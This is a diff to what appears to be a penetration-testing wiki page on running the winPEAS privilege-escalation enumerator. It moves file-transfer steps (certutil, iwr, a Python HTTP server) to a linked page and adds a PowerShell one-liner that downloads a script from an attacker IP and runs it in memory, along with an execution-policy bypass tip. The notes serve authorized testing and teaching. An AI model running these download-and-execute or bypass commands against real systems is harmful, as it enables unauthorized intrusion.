@@ -7,24 +7,7 @@ Part of the [PEASS-ng](https://github.com/peass-ng/PEASS-ng) suite. Automates Wi
 
 ## Transfer to Target
 
-**Attacker machine - serve the file**
-```bash
-python3 -m http.server 80
-```
-
-**Target machine - download it**
-```powershell
-# PowerShell
-iwr -uri http://<attacker-ip>/winpeas.exe -outfile winpeas.exe
-
-# certutil (often available on older systems)
-certutil -urlcache -split -f http://<attacker-ip>/winpeas.exe winpeas.exe
-```
-
-**Run PowerShell version directly in memory (no file on disk)**
-```powershell
-iex(new-object net.webclient).downloadstring('http://<attacker-ip>/winpeas.ps1')
-```
+→ [[File-Transfers]]
 
 ---
 
@@ -41,6 +24,9 @@ iex(new-object net.webclient).downloadstring('http://<attacker-ip>/winpeas.ps1')
 .\winpeas.exe systeminfo
 .\winpeas.exe userinfo
 .\winpeas.exe servicesinfo
+
+# In-memory — no file written to disk
+iex(new-object net.webclient).downloadstring('http://<attacker-ip>/winpeas.ps1')
 ```
 
 > If execution is blocked, try: `powershell -ep bypass`
